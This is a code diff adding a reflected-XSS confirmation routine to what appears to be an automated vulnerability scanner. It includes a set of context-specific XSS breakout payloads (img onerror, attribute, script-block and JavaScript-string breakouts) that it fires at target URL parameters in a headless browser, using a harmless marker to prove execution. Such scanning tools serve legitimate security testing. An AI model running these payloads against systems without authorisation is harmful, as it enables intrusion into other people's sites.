@@ -4453,7 +4453,7 @@ def run_probe_xss_reflection(
                         "payload": payload,
                         "evidence": f"Unescaped payload reflected in {ctx} context",
                         "source": "probe_xss",
-                        "next_step": "Call test_dom_xss or xss_test to confirm execution",
+                        "next_step": f"Call confirm_xss(target_url, param='{param}', contexts='{ctx}') to prove execution in a browser",
                     }
                     findings.append(finding)
                     bridge.submit_vulnerability(
@@ -4482,10 +4482,185 @@ def run_probe_xss_reflection(
         "candidates": findings,
         "count": len(findings),
         "next_step": (
-            "Confirm with test_dom_xss(target_url, params='...') or xss_test; "
-            "then confirm_vulnerability_poc"
+            "Confirm EXECUTION with confirm_xss(target_url, param='<p>', contexts='<ctx>') "
+            "for each reflection above (carries the classified context into a real "
+            "browser); then confirm_vulnerability_poc"
             if (reflections or findings) else
             "No reflections — try discover_parameters, crawl forms, or DOM sinks via test_dom_xss"
+        ),
+    }
+
+
+# Context -> browser breakout payload. The window.__vanguard_xss marker fires ONLY
+# when the payload actually executes in a browser, so a hit is proof of execution
+# (reflected OR DOM), not mere reflection. {canary} is a unique per-run id.
+def _xss_confirm_payloads(canary: str) -> Dict[str, str]:
+    m = "window.__vanguard_xss=document.location.href"
+    return {
+        "html_body": f'<img src=x id={canary} onerror="{m}">',
+        "raw_reflection": f'<img src=x id={canary} onerror="{m}">',
+        "attr_double": f'"><img src=x id={canary} onerror="{m}">',
+        "attr_single": f"'><img src=x id={canary} onerror=\"{m}\">",
+        "script_block": f'</script><img src=x id={canary} onerror="{m}">',
+        "js_string": f"';{m};//",
+        "html_comment": f'--><img src=x id={canary} onerror="{m}"><!--',
+    }
+
+
+def _build_xss_confirm_cases(
+    target_url: str,
+    params: List[str],
+    contexts: List[str],
+    canary: str,
+) -> List[dict]:
+    """Pure: expand (param x context) into concrete GET test URLs carrying a
+    context-matched breakout payload. Classified contexts are tried first; with
+    none given (or none recognized) every context is tried. Duplicate payloads
+    per parameter are collapsed so html_body/raw_reflection don't double-fetch.
+    """
+    payloads = _xss_confirm_payloads(canary)
+    ordered = [c for c in contexts if c in payloads] or list(payloads)
+    cases: List[dict] = []
+    for param in params:
+        seen: set = set()
+        for ctx in ordered:
+            payload = payloads[ctx]
+            if payload in seen:
+                continue
+            seen.add(payload)
+            cases.append({
+                "param": param,
+                "context": ctx,
+                "payload": payload,
+                "url": _mutate_url_param(target_url, param, payload),
+            })
+    return cases
+
+
+def run_confirm_xss_reflection(
+    target_url: str,
+    bridge: ASMBridge,
+    param: str = "",
+    contexts: str = "",
+    params: str = "",
+    timeout: int = 60,
+) -> dict:
+    """Confirm reflected (or DOM) XSS by EXECUTING a context-matched breakout
+    payload in a real Chromium browser — proof of execution, not reflected text.
+
+    This is the confirmation step for run_probe_xss_reflection: the probe classifies
+    where a parameter reflects (attr_double, script_block, js_string, ...), and this
+    carries that exact breakout into the browser so the window.__vanguard_xss marker
+    (or a dialog) only trips on real execution. Unlike run_dom_xss_test's fixed
+    generic payloads, the breakout is driven by the classified context, so reflected
+    XSS in single-quoted attributes, inside <script>, and HTML comments is covered.
+
+    Scope: GET query-parameter injection (the common reflected case). Client-side /
+    fragment sinks remain run_dom_xss_test's job; POST-reflected sinks need a form path.
+    """
+    try:
+        from playwright.sync_api import sync_playwright
+    except ImportError:
+        logger.error("playwright not installed")
+        return {
+            "status": "unavailable", "inconclusive": True,
+            "error": "playwright not installed", "findings": [], "results": [],
+            "confirmed": False, "vulnerable": False, "count": 0,
+        }
+
+    parsed = urlparse(target_url)
+    param_list = [p.strip() for p in (params or param or "").split(",") if p.strip()]
+    if not param_list:
+        param_list = [k for k, _ in parse_qsl(parsed.query, keep_blank_values=True)]
+    if not param_list:
+        return {
+            "status": "ok", "inconclusive": False, "findings": [], "results": [],
+            "confirmed": False, "vulnerable": False, "count": 0,
+            "error": "no parameters to confirm — pass param= from probe_xss_reflection",
+        }
+
+    ctx_list = [c.strip() for c in contexts.split(",") if c.strip()]
+    canary = f"vanguardXSS{os.urandom(3).hex()}"
+    cases = _build_xss_confirm_cases(target_url, param_list, ctx_list, canary)
+
+    findings: List[dict] = []
+    confirmed_params: set = set()
+
+    with sync_playwright() as p:
+        browser = p.chromium.launch(
+            headless=True,
+            args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"],
+        )
+        context = browser.new_context(ignore_https_errors=True)
+        page = context.new_page()
+        dialogs: List[str] = []
+        page.on("dialog", lambda d: (dialogs.append(d.message), d.dismiss()))
+
+        for tc in cases:
+            if tc["param"] in confirmed_params:
+                continue  # one proof per parameter is enough
+            try:
+                page.goto(tc["url"], wait_until="domcontentloaded", timeout=10000)
+                page.wait_for_timeout(1000)
+                hit = page.evaluate("() => window.__vanguard_xss || null")
+                dialog_hit = dialogs[-1] if dialogs else None
+                if hit or dialog_hit:
+                    evidence = (
+                        f"window.__vanguard_xss={hit}" if hit
+                        else f"dialog triggered: {dialog_hit}"
+                    )
+                    title = f"Reflected XSS confirmed in '{tc['param']}' ({tc['context']})"
+                    finding = {
+                        "title": title, "name": title,
+                        "url": tc["url"], "matched_at": tc["url"],
+                        "parameter": tc["param"], "context": tc["context"],
+                        "payload": tc["payload"], "severity": "high",
+                        "vuln_type": "xss", "type": "xss",
+                        "vulnerable": True, "confirmed": True,
+                        "evidence": evidence, "source": "browser_xss_confirm",
+                    }
+                    findings.append(finding)
+                    confirmed_params.add(tc["param"])
+                    bridge.submit_vulnerability(
+                        host=parsed.hostname or target_url,
+                        title=title,
+                        severity="high",
+                        source="browser_xss_confirm",
+                        url=tc["url"],
+                        description=(
+                            f"XSS execution confirmed in a real browser. "
+                            f"Parameter '{tc['param']}', {tc['context']} context.\n"
+                            f"Payload: {tc['payload']}\nEvidence: {evidence}"
+                        ),
+                        confidence="confirmed",
+                        tags=["xss", "reflected-xss", "browser-confirmed", tc["context"]],
+                        raw_data={"poc": finding},
+                    )
+                    page.evaluate("() => { window.__vanguard_xss = undefined; }")
+                    dialogs.clear()
+            except Exception as e:
+                logger.debug("xss confirm case error (%s): %s", tc["url"][:80], e)
+
+        browser.close()
+
+    if findings:
+        bridge.flush()
+    logger.info("confirm_xss_reflection: %d confirmed on %s", len(findings), target_url)
+    return {
+        "status": "ok",
+        "inconclusive": False,
+        "findings": findings,
+        "results": findings,
+        "confirmed": len(findings) > 0,
+        "vulnerable": len(findings) > 0,
+        "count": len(findings),
+        "params_tested": param_list,
+        "contexts_tried": ctx_list or "all",
+        "next_step": (
+            "Confirmed — call confirm_vulnerability_poc to attach the PoC and escalate."
+            if findings else
+            "No execution. Recheck the probe_xss_reflection context, try test_dom_xss "
+            "for client-side sinks, or the reflection may be non-exploitable (encoded)."
         ),
     }
 
